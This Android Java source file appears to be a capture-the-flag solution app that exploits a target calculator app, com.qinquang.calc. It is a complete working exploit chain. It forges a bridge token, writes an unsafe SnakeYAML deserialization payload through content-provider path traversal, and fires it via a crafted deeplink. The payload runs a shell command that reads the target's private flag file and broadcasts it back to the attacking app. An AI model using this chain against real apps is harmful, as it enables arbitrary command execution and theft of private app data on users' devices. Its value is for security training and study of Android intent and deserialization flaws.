package com.qinquang.exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.yaml.snakeyaml.Yaml;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ExploitActivity";
    private static final String TARGET_PKG = "com.qinquang.calc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.exploit_button);
        exploitButton.setOnClickListener(v -> {
            try {
                triggerExploit();
                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                Log.e(TAG, "Exploit failed", e);
                Toast.makeText(this, "Exploit failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }

    private void triggerExploit() throws Exception {
        // 1. Generate the bridge_token for BridgeActivity validation
        String token = generateToken(TARGET_PKG);
        Log.d(TAG, "Generated Token: " + token);

        // 2. Craft the YAML payload to execute the command
        // The command reads the flag and broadcasts it to our FlagReceiver
        String command = "cat /data/data/com.qinquang.calc/flag-*.txt | xargs -I {} am broadcast -a com.qinquang.calc.FLAG --es flag {}";
        String yamlPayload = "!!com.qinquang.calc.PingUtil [\"" + command + "\"]";
        Log.d(TAG, "YAML Payload: " + yamlPayload);

        // 3. Craft the fallback Intent that will write the YAML payload
        // This Intent will be triggered when the division by zero exception occurs
        Intent fallbackIntent = new Intent(Intent.ACTION_VIEW);
        
        // Use path traversal to write to history.yml in the app's files directory
        // ..%2f goes up from the ContentProvider's base directory
        Uri maliciousUri = Uri.parse("content://com.qinquang.calc/..%2f..%2fhistory.yml");
        fallbackIntent.setData(maliciousUri);
        
        // These flags are required:
        // - FLAG_ACTIVITY_NEW_TASK: Required by BridgeActivity.checkIntentFlags()
        // - FLAG_GRANT_WRITE_URI_PERMISSION: Needed to write to the ContentProvider
        fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        
        // Set up the ContentValues that BridgeActivity expects
        ContentValues bridgeValues = new ContentValues();
        bridgeValues.put("action", "process");  // Must be "process"
        bridgeValues.put("target", "history");   // Must be "history"
        fallbackIntent.putExtra("bridge_values", bridgeValues);
        fallbackIntent.putExtra("bridge_token", token);
        
        // Put the YAML payload as the data to write
        fallbackIntent.putExtra("data", yamlPayload);

        // 4. Convert the fallback Intent to URI format
        String fallbackIntentUri = fallbackIntent.toUri(Intent.URI_INTENT_SCHEME);
        Log.d(TAG, "Fallback Intent URI: " + fallbackIntentUri);

        // 5. Construct the complete exploit expression
        // Format: "1/0#intent:..." 
        // - "1/0" triggers ArithmeticException
        // - Everything after "#" is parsed as the intent URI for fallback
        String expression = "1/0#" + fallbackIntentUri;
        Log.d(TAG, "Full Expression: " + expression);

        // 6. Create the deeplink to the target app
        // Correct scheme is "qiangcalc://calculate" based on AndroidManifest.xml
        Uri deeplinkUri = Uri.parse("qiangcalc://calculate?expression=" + URLEncoder.encode(expression, StandardCharsets.UTF_8.name()));
        Log.d(TAG, "Deeplink URI: " + deeplinkUri);

        // 7. Launch the exploit via deeplink
        Intent exploitIntent = new Intent(Intent.ACTION_VIEW, deeplinkUri);
        exploitIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(exploitIntent);
        
        Log.d(TAG, "Exploit triggered! Waiting for flag broadcast...");
    }

    private String generateToken(String packageName) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(packageName.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            sb.append(String.format("%02x", hash[i]));
        }
        return sb.toString();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        // This is now primarily for local testing convenience, 
        // as the FlagReceiver handles the critical logging.
        if (intent != null && intent.hasExtra("flag")) {
            TextView flagTextView = findViewById(R.id.flag_textview);
            String flag = intent.getStringExtra("flag");
            flagTextView.setText("FLAG: " + flag);
        }
    }
}
